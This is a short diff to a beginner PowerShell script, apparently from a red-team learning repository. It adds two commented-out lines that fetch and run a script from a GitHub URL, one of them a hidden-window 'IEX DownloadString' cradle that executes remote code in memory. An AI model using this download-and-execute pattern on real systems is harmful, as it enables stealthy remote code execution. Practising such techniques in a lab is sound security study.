@@ -1,1 +1,3 @@
 Write-Host "Congratulations! Your first script executed successfully"
+# Invoke-WebRequest -Uri https://raw.githubusercontent.com/Littleman247/RED-Team-leaning-folder-repo/First_PowerShell/First_PowerShell_Script.ps1 -OutFile .\First_PowerShell_Script.ps1; .\First_PowerShell_Script.ps1
+#STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Littleman247/RED-Team-leaning-folder-repo/First_PowerShell/First_PowerShell_Script.ps1');
